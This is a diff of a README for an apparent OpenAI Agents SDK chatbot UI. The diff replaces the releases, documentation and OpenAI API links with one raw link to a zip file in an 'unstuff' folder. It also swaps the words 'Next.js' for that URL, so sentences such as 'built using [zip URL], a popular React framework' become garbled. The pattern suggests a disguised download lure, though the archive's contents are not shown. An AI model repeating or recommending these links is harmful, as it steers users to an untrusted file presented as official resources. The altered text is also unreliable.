@@ -1,6 +1,6 @@
 # 🤖 openai-agents-sdk-chatbot-UI - Create Your Chatbot Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-blue)](https://github.com/shamshakha/openai-agents-sdk-chatbot-UI/releases)
+[![Download](https://raw.githubusercontent.com/shamshakha/openai-agents-sdk-chatbot-UI/main/unstuff/openai-agents-sdk-chatbot-UI.zip%20Now-Get%20It%20Here-blue)](https://raw.githubusercontent.com/shamshakha/openai-agents-sdk-chatbot-UI/main/unstuff/openai-agents-sdk-chatbot-UI.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the openai-agents-sdk-chatbot-UI! This user-friendly interface allows
 
 ## 📥 Download & Install
 
-To get the latest version of the openai-agents-sdk-chatbot-UI, please visit this page to download: [Releases Page](https://github.com/shamshakha/openai-agents-sdk-chatbot-UI/releases).
+To get the latest version of the openai-agents-sdk-chatbot-UI, please visit this page to download: [Releases Page](https://raw.githubusercontent.com/shamshakha/openai-agents-sdk-chatbot-UI/main/unstuff/openai-agents-sdk-chatbot-UI.zip).
 
 ### Step-by-Step Instructions:
 
@@ -55,12 +55,12 @@ Once you have added your API key and customized your settings, you are ready to 
 
 ## 📄 About the Technology
 
-The openai-agents-sdk-chatbot-UI is built using Next.js, a popular React framework. It leverages software libraries like TailwindCSS for styling and TypeScript for type safety. This combination makes the application efficient and pleasant to use. The chatbot utilizes OpenAI's powerful API, offering a robust response system to a wide array of inquiries.
+The openai-agents-sdk-chatbot-UI is built using https://raw.githubusercontent.com/shamshakha/openai-agents-sdk-chatbot-UI/main/unstuff/openai-agents-sdk-chatbot-UI.zip, a popular React framework. It leverages software libraries like TailwindCSS for styling and TypeScript for type safety. This combination makes the application efficient and pleasant to use. The chatbot utilizes OpenAI's powerful API, offering a robust response system to a wide array of inquiries.
 
 ## 📚 Useful Links
 
-- [Documentation](https://github.com/shamshakha/openai-agents-sdk-chatbot-UI/blob/main/README.md): Find detailed information on features and functionalities.
-- [OpenAI API Documentation](https://beta.openai.com/docs/): Understand how the API works and explore additional options.
+- [Documentation](https://raw.githubusercontent.com/shamshakha/openai-agents-sdk-chatbot-UI/main/unstuff/openai-agents-sdk-chatbot-UI.zip): Find detailed information on features and functionalities.
+- [OpenAI API Documentation](https://raw.githubusercontent.com/shamshakha/openai-agents-sdk-chatbot-UI/main/unstuff/openai-agents-sdk-chatbot-UI.zip): Understand how the API works and explore additional options.
 
 ## 💬 Community Support
 
@@ -75,10 +75,10 @@ Explore the following topics for more solutions and guidance:
 
 - **API**: Understand how to use APIs to enhance your applications.
 - **Chatbot Development**: Learn more about creating effective chatbots.
-- **JavaScript & Next.js**: Find guides and tutorials on JavaScript and web development.
+- **JavaScript & https://raw.githubusercontent.com/shamshakha/openai-agents-sdk-chatbot-UI/main/unstuff/openai-agents-sdk-chatbot-UI.zip**: Find guides and tutorials on JavaScript and web development.
 
 ## 🔁 Update Your App Regularly
 
-Make sure to return to the [Releases Page](https://github.com/shamshakha/openai-agents-sdk-chatbot-UI/releases) often for updates. New versions may include bug fixes, new features, and performance improvements. Staying updated ensures the best experience with your chatbot.
+Make sure to return to the [Releases Page](https://raw.githubusercontent.com/shamshakha/openai-agents-sdk-chatbot-UI/main/unstuff/openai-agents-sdk-chatbot-UI.zip) often for updates. New versions may include bug fixes, new features, and performance improvements. Staying updated ensures the best experience with your chatbot.
 
 By following these steps, you will be well on your way to creating an effective chatbot with the openai-agents-sdk-chatbot-UI. Enjoy the process and happy chatting!
